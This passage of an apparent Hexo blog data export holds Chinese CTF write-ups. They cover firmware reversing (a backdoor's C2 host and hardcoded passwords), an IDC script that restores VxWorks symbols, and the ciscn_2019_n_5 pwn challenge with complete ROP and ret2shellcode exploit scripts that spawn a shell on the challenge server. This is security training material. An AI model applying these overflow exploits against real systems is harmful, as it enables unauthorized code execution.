class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">/* 脚本内容 */</span><br><span class=\"hljs-comment\">/* Ruben Santamarta - IOActive */</span><br><span class=\"hljs-comment\">/* Rebuild VxWorks Symbol Table */</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;idc.idc&gt;</span></span><br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>     <span class=\"hljs-keyword\">auto</span> load_addr;<br>\t <span class=\"hljs-keyword\">auto</span> ea;<br>\t <span class=\"hljs-keyword\">auto</span> offset;<br>\t <span class=\"hljs-keyword\">auto</span> sName;<br>\t <span class=\"hljs-keyword\">auto</span> eaStart;<br>\t <span class=\"hljs-keyword\">auto</span> eaEnd; <br><br>\t<span class=\"hljs-comment\">// You&#x27;ll need to adjust these values</span><br>\tload_addr = <span class=\"hljs-number\">0x10000</span>; <span class=\"hljs-comment\">/* 加载地址 */</span> <br>\teaStart = <span class=\"hljs-number\">0x301E74</span> + load_addr; <span class=\"hljs-comment\">/* 符号表起始地 */</span><br>\teaEnd = <span class=\"hljs-number\">0x3293b4</span> + load_addr; <span class=\"hljs-comment\">/* 符号表结束地址 */</span><br>\t<br>\t SetStatus(IDA_STATUS_WORK);<br>\t ea = eaStart;<br>\t <br>\t <span class=\"hljs-keyword\">while</span>( ea &lt; eaEnd) &#123;<br>\t \tMakeDword( ea );<br>\t \toffset = <span class=\"hljs-number\">0</span>;<br>\t \t<span class=\"hljs-keyword\">if</span> ( Dword( ea ) == <span class=\"hljs-number\">0x900</span> || Dword( ea ) == <span class=\"hljs-number\">0x500</span>)<br>\t \t&#123;<br>\t \t\toffset = <span class=\"hljs-number\">8</span>;<br>\t \t&#125;<br>\t \t<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>( Dword( ea ) == <span class=\"hljs-number\">0x90000</span> || Dword( ea ) == <span class=\"hljs-number\">0x50000</span> )<br>\t \t&#123;\t<br>\t \t\toffset = <span class=\"hljs-number\">0xc</span>;<br>\t \t&#125;\t \t<br>\t \t<span class=\"hljs-keyword\">if</span>( offset )<br>\t \t&#123;<br>\t \t\tMakeStr( Dword( ea - offset ), BADADDR);\t \t\t<br>\t \t\tsName = GetString( Dword( ea - offset ), <span class=\"hljs-number\">-1</span>, ASCSTR_C ) ; <br>\t \t \t<span class=\"hljs-keyword\">if</span> ( sName )<br>\t \t \t&#123;<br>\t \t \t\t<span class=\"hljs-keyword\">if</span>( Dword( ea ) == <span class=\"hljs-number\">0x500</span> || Dword( ea ) == <span class=\"hljs-number\">0x50000</span>)<br>\t \t \t\t&#123;<br>\t \t \t    \t<span class=\"hljs-keyword\">if</span> (  GetFunctionName( Dword( ea - offset + <span class=\"hljs-number\">4</span>) ) == <span class=\"hljs-string\">&quot;&quot;</span> )<br>\t \t \t    \t&#123;<br>\t \t \t    \t\tMakeCode( Dword( ea - offset + <span class=\"hljs-number\">4</span>) );<br>\t \t\t\t\t\tMakeFunction( Dword( ea - offset + <span class=\"hljs-number\">4</span>), BADADDR );\t<br>\t \t \t    \t&#125;<br>\t \t \t    &#125;<br>\t \t \t\tMakeName( Dword( ea - offset + <span class=\"hljs-number\">4</span> ), sName ); \t \t\t<br>\t \t \t&#125;<br>\t \t&#125;<br>\t \tea = ea + <span class=\"hljs-number\">4</span>; \t \t \t<br>\t &#125;<br>\t <br>\t SetStatus(IDA_STATUS_READY);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>导入之后函数确实恢复出来了</p>\n<p>如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案…</p>\n<p><img src=\"/img/firmware/16.jpg\"></p>\n<p>不做具体分析了（代码太多</p>\n","site":{"data":{}},"more":"<h4 id=\"题目1-buuctf-firmware\"><a href=\"#题目1-buuctf-firmware\" class=\"headerlink\" title=\"题目1-buuctf-firmware\"></a>题目1-buuctf-firmware</h4><p><a href=\"https://buuoj.cn/challenges#firmware\">https://buuoj.cn/challenges#firmware</a></p>\n<p><img src=\"/img/firmware/1.jpg\"></p>\n<p>使用binwalk提取固件</p>\n<p><img src=\"/img/firmware/2.jpg\"></p>\n<p>可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序</p>\n<p><img src=\"/img/firmware/3.jpg\"></p>\n<p>用upx脱壳后寻找类似网址的字符串，找到以下三个</p>\n<p><img src=\"/img/firmware/4.jpg\"></p>\n<p>首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个</p>\n<p><img src=\"/img/firmware/5.jpg\"></p>\n<p>第二个、第三个只出现在send函数发送的字符串里，显然不对</p>\n<p><img src=\"/img/firmware/6.jpg\"></p>\n<p><img src=\"/img/firmware/7.jpg\"></p>\n<p>因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p>\n<h4 id=\"题目2-CTFHUB-二次设备固件逆向\"><a href=\"#题目2-CTFHUB-二次设备固件逆向\" class=\"headerlink\" title=\"题目2-CTFHUB-二次设备固件逆向\"></a>题目2-CTFHUB-二次设备固件逆向</h4><p>直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串</p>\n<p><img src=\"/img/firmware/8.jpg\"></p>\n<p>打开JZPHMISystem，搜索password字符串</p>\n<p><img src=\"/img/firmware/9.jpg\"></p>\n<p>按x找引用到这里，发现了一个叫做inputPassword的函数</p>\n<p><img src=\"/img/firmware/10.jpg\"></p>\n<p>这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数</p>\n<p><img src=\"/img/firmware/11.jpg\"></p>\n<p>双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码</p>\n<p>然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程</p>\n<p>只不过在rootPasswd这里存在区别</p>\n<p><img src=\"/img/firmware/12.jpg\"></p>\n<p>把这个icspwd提交上去就是对的。。。前面那个689078就不行</p>\n<h4 id=\"题目3-CTFHUB-简单的固件逆向分析\"><a href=\"#题目3-CTFHUB-简单的固件逆向分析\" class=\"headerlink\" title=\"题目3-CTFHUB-简单的固件逆向分析\"></a>题目3-CTFHUB-简单的固件逆向分析</h4><p>用tree查看文件结构之后发现有用的二进制文件只有一个<code>wwwroot/conf/exec/NOE7701.bin</code></p>\n<p>使用binwalk提取出来217和217.zlib两个文件</p>\n<p>用binwalk -A查看217的架构，发现是PowerPC big-endian</p>\n<p><img src=\"/img/firmware/13.jpg\"></p>\n<p>接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 <a href=\"https://www.cnblogs.com/yangmzh3/p/11231423.html\">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p>\n<p><img src=\"/img/firmware/13_.jpg\"></p>\n<p>用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址</p>\n<p><img src=\"/img/firmware/14.jpg\"></p>\n<p><img src=\"/img/firmware/15.jpg\"></p>\n<p>发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名</p>\n<p>从网上找了这个idc脚本，用于恢复VxWorks符号表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">/* 脚本内容 */</span><br><span class=\"hljs-comment\">/* Ruben Santamarta - IOActive */</span><br><span class=\"hljs-comment\">/* Rebuild VxWorks Symbol Table */</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;idc.idc&gt;</span></span><br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>     <span class=\"hljs-keyword\">auto</span> load_addr;<br>\t <span class=\"hljs-keyword\">auto</span> ea;<br>\t <span class=\"hljs-keyword\">auto</span> offset;<br>\t <span class=\"hljs-keyword\">auto</span> sName;<br>\t <span class=\"hljs-keyword\">auto</span> eaStart;<br>\t <span class=\"hljs-keyword\">auto</span> eaEnd; <br><br>\t<span class=\"hljs-comment\">// You&#x27;ll need to adjust these values</span><br>\tload_addr = <span class=\"hljs-number\">0x10000</span>; <span class=\"hljs-comment\">/* 加载地址 */</span> <br>\teaStart = <span class=\"hljs-number\">0x301E74</span> + load_addr; <span class=\"hljs-comment\">/* 符号表起始地 */</span><br>\teaEnd = <span class=\"hljs-number\">0x3293b4</span> + load_addr; <span class=\"hljs-comment\">/* 符号表结束地址 */</span><br>\t<br>\t SetStatus(IDA_STATUS_WORK);<br>\t ea = eaStart;<br>\t <br>\t <span class=\"hljs-keyword\">while</span>( ea &lt; eaEnd) &#123;<br>\t \tMakeDword( ea );<br>\t \toffset = <span class=\"hljs-number\">0</span>;<br>\t \t<span class=\"hljs-keyword\">if</span> ( Dword( ea ) == <span class=\"hljs-number\">0x900</span> || Dword( ea ) == <span class=\"hljs-number\">0x500</span>)<br>\t \t&#123;<br>\t \t\toffset = <span class=\"hljs-number\">8</span>;<br>\t \t&#125;<br>\t \t<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>( Dword( ea ) == <span class=\"hljs-number\">0x90000</span> || Dword( ea ) == <span class=\"hljs-number\">0x50000</span> )<br>\t \t&#123;\t<br>\t \t\toffset = <span class=\"hljs-number\">0xc</span>;<br>\t \t&#125;\t \t<br>\t \t<span class=\"hljs-keyword\">if</span>( offset )<br>\t \t&#123;<br>\t \t\tMakeStr( Dword( ea - offset ), BADADDR);\t \t\t<br>\t \t\tsName = GetString( Dword( ea - offset ), <span class=\"hljs-number\">-1</span>, ASCSTR_C ) ; <br>\t \t \t<span class=\"hljs-keyword\">if</span> ( sName )<br>\t \t \t&#123;<br>\t \t \t\t<span class=\"hljs-keyword\">if</span>( Dword( ea ) == <span class=\"hljs-number\">0x500</span> || Dword( ea ) == <span class=\"hljs-number\">0x50000</span>)<br>\t \t \t\t&#123;<br>\t \t \t    \t<span class=\"hljs-keyword\">if</span> (  GetFunctionName( Dword( ea - offset + <span class=\"hljs-number\">4</span>) ) == <span class=\"hljs-string\">&quot;&quot;</span> )<br>\t \t \t    \t&#123;<br>\t \t \t    \t\tMakeCode( Dword( ea - offset + <span class=\"hljs-number\">4</span>) );<br>\t \t\t\t\t\tMakeFunction( Dword( ea - offset + <span class=\"hljs-number\">4</span>), BADADDR );\t<br>\t \t \t    \t&#125;<br>\t \t \t    &#125;<br>\t \t \t\tMakeName( Dword( ea - offset + <span class=\"hljs-number\">4</span> ), sName ); \t \t\t<br>\t \t \t&#125;<br>\t \t&#125;<br>\t \tea = ea + <span class=\"hljs-number\">4</span>; \t \t \t<br>\t &#125;<br>\t <br>\t SetStatus(IDA_STATUS_READY);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>导入之后函数确实恢复出来了</p>\n<p>如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案…</p>\n<p><img src=\"/img/firmware/16.jpg\"></p>\n<p>不做具体分析了（代码太多</p>\n"},{"title":"VxWorks固件函数符号恢复、固件加载地址识别","date":"2023-05-12T06:01:00.000Z","excerpt":"CTF_HUB 某嵌入式设备固件升级包","_content":"\n### 固件提取\n\n![](/img/VxWorks/1.jpg)\n\n参考文章 [CTFHUB-WriteUp](https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html)\n\nbinwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表\n\n![](/img/VxWorks/2.jpg)\n\n然后用binwalk -A 确定架构和大小端\n\n![](/img/VxWorks/3.jpg)\n\n### 符号表\n\n从binwalk结果可以看出符号表在`0x301E74`附近（这不一定是真实值）\n\n![](/img/VxWorks/4.jpg)\n\nVxWorks符号表每一项由4部分组成，0-3字节是4个`00`，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。\n\n如上图，这是一个符号地址在`0x27655C`，内容在`0x1FF058`，类型为函数（0x500）的一个符号\n\n函数名字\n\nwriteup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题\n\n（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪...）\n\n","source":"_posts/固件仿真/Vxworks.md","raw":"---\ntitle: VxWorks固件函数符号恢复、固件加载地址识别\ntags: [firmware analysis]\ndate: 2023-05-12 14:01:00\ncategories: [固件仿真]\nexcerpt: CTF_HUB 某嵌入式设备固件升级包\n---\n\n### 固件提取\n\n![](/img/VxWorks/1.jpg)\n\n参考文章 [CTFHUB-WriteUp](https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html)\n\nbinwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表\n\n![](/img/VxWorks/2.jpg)\n\n然后用binwalk -A 确定架构和大小端\n\n![](/img/VxWorks/3.jpg)\n\n### 符号表\n\n从binwalk结果可以看出符号表在`0x301E74`附近（这不一定是真实值）\n\n![](/img/VxWorks/4.jpg)\n\nVxWorks符号表每一项由4部分组成，0-3字节是4个`00`，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。\n\n如上图，这是一个符号地址在`0x27655C`，内容在`0x1FF058`，类型为函数（0x500）的一个符号\n\n函数名字\n\nwriteup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题\n\n（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪...）\n\n","slug":"固件仿真/Vxworks","published":1,"updated":"2023-05-13T03:03:02.592Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clllwuj8t0000qgufay6l9pvl","content":"<h3 id=\"固件提取\"><a href=\"#固件提取\" class=\"headerlink\" title=\"固件提取\"></a>固件提取</h3><p><img src=\"/img/VxWorks/1.jpg\"></p>\n<p>参考文章 <a href=\"https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html\">CTFHUB-WriteUp</a></p>\n<p>binwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表</p>\n<p><img src=\"/img/VxWorks/2.jpg\"></p>\n<p>然后用binwalk -A 确定架构和大小端</p>\n<p><img src=\"/img/VxWorks/3.jpg\"></p>\n<h3 id=\"符号表\"><a href=\"#符号表\" class=\"headerlink\" title=\"符号表\"></a>符号表</h3><p>从binwalk结果可以看出符号表在<code>0x301E74</code>附近（这不一定是真实值）</p>\n<p><img src=\"/img/VxWorks/4.jpg\"></p>\n<p>VxWorks符号表每一项由4部分组成，0-3字节是4个<code>00</code>，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。</p>\n<p>如上图，这是一个符号地址在<code>0x27655C</code>，内容在<code>0x1FF058</code>，类型为函数（0x500）的一个符号</p>\n<p>函数名字</p>\n<p>writeup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题</p>\n<p>（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪…）</p>\n","site":{"data":{}},"more":"<h3 id=\"固件提取\"><a href=\"#固件提取\" class=\"headerlink\" title=\"固件提取\"></a>固件提取</h3><p><img src=\"/img/VxWorks/1.jpg\"></p>\n<p>参考文章 <a href=\"https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html\">CTFHUB-WriteUp</a></p>\n<p>binwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表</p>\n<p><img src=\"/img/VxWorks/2.jpg\"></p>\n<p>然后用binwalk -A 确定架构和大小端</p>\n<p><img src=\"/img/VxWorks/3.jpg\"></p>\n<h3 id=\"符号表\"><a href=\"#符号表\" class=\"headerlink\" title=\"符号表\"></a>符号表</h3><p>从binwalk结果可以看出符号表在<code>0x301E74</code>附近（这不一定是真实值）</p>\n<p><img src=\"/img/VxWorks/4.jpg\"></p>\n<p>VxWorks符号表每一项由4部分组成，0-3字节是4个<code>00</code>，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。</p>\n<p>如上图，这是一个符号地址在<code>0x27655C</code>，内容在<code>0x1FF058</code>，类型为函数（0x500）的一个符号</p>\n<p>函数名字</p>\n<p>writeup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题</p>\n<p>（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪…）</p>\n"},{"title":"ROP ciscn_2019_c_1","date":"2022-11-16T11:07:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_n_5\n\n![](/img/ciscn_2019_n_5/1.jpg)\n\n依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）\n\n由于rop写习惯了，先列出rop的做法\n\n![](/img/ciscn_2019_n_5/2.jpg)\n\n第一个输入随便写，第二个输入开始溢出\n\n![](/img/ciscn_2019_n_5/3.jpg)\n\n溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址\n\n值得注意的是返回main后第二遍溢出时需要栈对齐\n\n**Exp1**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process(\"./ciscn_2019_n_5\")\np = remote('node4.buuoj.cn',27829)\n\ne = ELF(\"./ciscn_2019_n_5\")\n\nmain = e.symbols[\"main\"]\nputs_got = e.got[\"puts\"]\nputs_plt = e.plt[\"puts\"]\n\npop_rdi = 0x400713\nret = 0x4004c9\n\np.recvline()\np.sendline(b'aaaa')\np.recvline()\n\npayload = b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\np.sendlineafter(b\"What do you want to say to me?\\n\", payload)\n\nputs_addr =  u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\noffset = puts_addr - libc.dump('puts')\nsystem = offset + libc.dump('system')\nbinsh = offset + libc.dump('str_bin_sh')\n\np.recvline()\np.sendline(b'aaaa')\np.recvline()\n\npayload = b'a' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)\np.sendlineafter(b\"What do you want to say to me?\\n\", payload)\np.interactive()\n```\n\n\n\n**ret2shellcode**\n\n![](/img/ciscn_2019_n_5/4.jpg)\n\n由于题目给了bss段上100个字节的空间，可以用来写shellcode\n\n需要在注意的包括context.arch设置平台环境\n\n而且特意看了一下 `len(shellcode) `是 48 < 100字节\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process(\"./ciscn_2019_n_5\")\np = remote('node4.buuoj.cn',27829)\n\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\nshellcode = asm(shellcraft.sh())\nname_addr = 0x0601080\np.sendlineafter(\"tell me your name\\n\",shellcode)\npayload = b'a' * (0x20 + 0x8) + p64(name_addr)\np.sendlineafter(b\"What do you want to say to me?\\n\",payload)\np.interactive()\n```\n\n","source":"_posts/ctf-pwn/ciscn_2019_n_5.md","raw":"---\ntitle: ROP ciscn_2019_c_1\ntags: [ctf-pwn,exp]\ndate: 2022-11-16 19:07:00\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_n_5\n\n![](/img/ciscn_2019_n_5/1.jpg)\n\n依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）\n\n由于rop写习惯了，先列出rop的做法\n\n![](/img/ciscn_2019_n_5/2.jpg)\n\n第一个输入随便写，第二个输入开始溢出\n\n![](/img/ciscn_2019_n_5/3.jpg)\n\n溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址\n\n值得注意的是返回main后第二遍溢出时需要栈对齐\n\n**Exp1**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process(\"./ciscn_2019_n_5\")\np = remote('node4.buuoj.cn',27829)\n\ne = ELF(\"./ciscn_2019_n_5\")\n\nmain = e.symbols[\"main\"]\nputs_got = e.got[\"puts\"]\nputs_plt = e.plt[\"puts\"]\n\npop_rdi = 0x400713\nret = 0x4004c9\n\np.recvline()\np.sendline(b'aaaa')\np.recvline()\n\npayload = b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\np.sendlineafter(b\"What do you want to say to me?\\n\", payload)\n\nputs_addr =  u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\noffset = puts_addr - libc.dump('puts')\nsystem = offset + libc.dump('system')\nbinsh = offset + libc.dump('str_bin_sh')\n\np.recvline()\np.sendline(b'aaaa')\np.recvline()\n\npayload = b'a' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)\np.sendlineafter(b\"What do you want to say to me?\\n\", payload)\np.interactive()\n```\n\n\n\n**ret2shellcode**\n\n![](/img/ciscn_2019_n_5/4.jpg)\n\n由于题目给了bss段上100个字节的空间，可以用来写shellcode\n\n需要在注意的包括context.arch设置平台环境\n\n而且特意看了一下 `len(shellcode) `是 48 < 100字节\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process(\"./ciscn_2019_n_5\")\np = remote('node4.buuoj.cn',27829)\n\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\nshellcode = asm(shellcraft.sh())\nname_addr = 0x0601080\np.sendlineafter(\"tell me your name\\n\",shellcode)\npayload = b'a' * (0x20 + 0x8) + p64(name_addr)\np.sendlineafter(b\"What do you want to say to me?\\n\",payload)\np.interactive()\n```\n\n","slug":"ctf-pwn/ciscn_2019_n_5","published":1,"updated":"2023-08-22T13:55:34.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllmdikge0000agufdo46co58","content":"<p><strong>题目</strong></p>\n<p>&lt;<a href=\"https://buuoj.cn/challenges#ciscn_2019_n_5\">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p>\n<p><img src=\"/img/ciscn_2019_n_5/1.jpg\"></p>\n<p>依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）</p>\n<p>由于rop写习惯了，先列出rop的做法</p>\n<p><img src=\"/img/ciscn_2019_n_5/2.jpg\"></p>\n<p>第一个输入随便写，第二个输入开始溢出</p>\n<p><img src=\"/img/ciscn_2019_n_5/3.jpg\"></p>\n<p>溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址</p>\n<p>值得注意的是返回main后第二遍溢出时需要栈对齐</p>\n<p><strong>Exp1</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">27829</span>)<br><br>e = ELF(<span class=\"hljs-string\">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>main = e.symbols[<span class=\"hljs-string\">&quot;main&quot;</span>]<br>puts_got = e.got[<span class=\"hljs-string\">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class=\"hljs-string\">&quot;puts&quot;</span>]<br><br>pop_rdi = <span class=\"hljs-number\">0x400713</span><br>ret = <span class=\"hljs-number\">0x4004c9</span><br><br>p.recvline()<br>p.sendline(<span class=\"hljs-string\">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>, payload)<br><br>puts_addr =  u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>, puts_addr)<br>offset = puts_addr - libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br><br>p.recvline()<br>p.sendline(<span 